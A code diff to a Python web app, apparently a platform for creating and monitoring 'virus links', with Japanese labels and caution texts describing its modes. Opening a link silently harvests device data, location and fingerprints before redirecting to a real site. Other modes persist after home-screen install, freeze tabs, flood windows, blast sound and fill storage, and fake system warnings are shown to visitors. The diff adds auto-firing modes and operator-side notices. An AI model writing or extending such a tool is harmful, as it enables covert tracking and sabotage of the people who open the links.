@@ -60,6 +60,24 @@ MODE_DESC = {
     "mix": "上の全部を段階的に同時発動させる最終兵器。",
 }
 
+# インストール済み（ホーム画面追加）で自動発射するモード
+AUTO_MODES = ("trojan_install", "mix")
+
+# 注意書き（兵器庫・監視室・兵器ページに表示）
+CAUTION = {
+    "trojan_link": "⚠ リンクを開いた瞬間から自動で始まります。開いただけで端末情報・位置・"
+                   "指紋を抜き取り、そのまま本物のサイトへ飛びます（自爆）。",
+    "trojan_install": "⚠ インストール（ホーム画面に追加）すると自爆します。以後その端末では"
+                      "自動で兵器が起動し続け、本人がアプリを消すまで止まりません。",
+    "max_power": "⚠ 開いた瞬間から自動で始まります。取れるものを全部・高頻度で抜き取ります。",
+    "brick": "⚠ 開いた瞬間から自動で始まります。タブが死ななくなり、端末が重くなります。",
+    "windows": "⚠ 開いた瞬間から自動で始まります。大量のウィンドウが勝手に開きます。",
+    "sound": "⚠ 開いた瞬間から自動で始まります。爆音が鳴り、画面が崩壊します。",
+    "storage": "⚠ 開いた瞬間から自動で始まります。端末の容量を使い切ります。",
+    "mix": "⚠ インストール（ホーム画面に追加）すると自爆します。開いた瞬間から全部が"
+           "段階的に発動し、以後その端末では自動で起動し続けます。",
+}
+
 SCHEMA = """
 CREATE TABLE IF NOT EXISTS virus_links(
   code TEXT PRIMARY KEY, name TEXT, mode TEXT, note TEXT, dest TEXT,
@@ -199,8 +217,11 @@ def list_page(request: Request, u=Depends(_auth)):
         r["share"] = base + "/v/" + r["code"]
         r["watch"] = base + "/vp/" + r["code"]
         r["mode_label"] = MODE_LABEL.get(r["mode"] or "", r["mode"] or "")
+        r["caution"] = CAUTION.get(r["mode"] or "", "")
+        r["auto"] = (r["mode"] in AUTO_MODES)
         r["live"] = False
     return _render("virus_list.html", request, rows=rows, base=base,
+                   cautions=CAUTION,
                    modes=[(m, MODE_LABEL[m], MODE_DESC[m]) for m in MODES])
 
 
@@ -290,6 +311,8 @@ def land(code: str, request: Request):
         "virus.html", request,
         code=code, link=dict(row), hit_id=hid, mode=mode,
         mode_label=MODE_LABEL[mode], mode_desc=MODE_DESC[mode],
+        caution=CAUTION.get(mode, ""),
+        auto=(mode in AUTO_MODES),
         dest=_abs_dest(row["dest"]), is_child=child, is_installed=installed,
         child_text=random.choice([
             "システム警告", "メモリ不足", "ディスク容量が危険です", "異常を検出しました",
@@ -366,6 +389,8 @@ def watch(code: str, request: Request, new: str = "", u=Depends(_auth)):
                    hits=hits, by_hit=by_hit, base=base, is_new=(new == "1"),
                    mode_label=MODE_LABEL.get(row["mode"] or "", row["mode"] or ""),
                    mode_desc=MODE_DESC.get(row["mode"] or "", ""),
+                   caution=CAUTION.get(row["mode"] or "", ""),
+                   auto=(row["mode"] in AUTO_MODES),
                    share=base + "/v/" + code, total=len(hits))
 
 
